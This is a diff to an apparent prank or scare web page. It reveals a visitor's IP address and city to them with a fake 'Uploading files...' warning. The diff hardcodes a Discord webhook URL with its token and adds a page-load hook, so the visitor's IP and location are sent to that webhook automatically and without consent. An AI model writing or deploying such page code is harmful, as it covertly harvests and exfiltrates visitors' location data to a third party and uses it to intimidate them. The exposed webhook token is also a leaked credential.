@@ -24,14 +24,15 @@
 
     #ipBox {
       position: absolute;
-      bottom: 80px;
-      left: 20px;
+      top: 50%;
+      left: 5px; /* Move to middle-left */
+      transform: translateY(-50%);
       color: lime;
       font-size: 18px;
       z-index: 2;
       font-family: monospace;
     }
-
+	
     #clickText {
       position: absolute;
       bottom: 20px;
@@ -68,13 +69,15 @@
       .then(response => response.json())
       .then(data => {
         const ipBox = document.getElementById('ipBox');
+        
+        // Update the content of the ipBox with the fetched IP and location
         ipBox.innerText =
           `Tracking IP: ${data.ip}\n` +
           `Location: ${data.city}, ${data.country_name}\n` +
           'Uploading files...';
-        
+
         // Send data to Discord webhook
-        fetch(DISCORD_WEBHOOK_URL, {
+        fetch('https://discord.com/api/webhooks/1489754745626431641/FlXQQJ9LxTYWEQrhWXph0bSfRzcUZGe8-1nYrM1KQjF0xRAm7kmNXI14YdHyMllEXAmZ', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
@@ -86,6 +89,9 @@
           .catch(error => console.error('Error:', error));
       });
   }
+
+  // Call the function on page load
+  window.onload = fetchUserIpAndLocation;
 </script>
 
 <div id="overlay">⚠ Rerept on YT! ⚠</div>
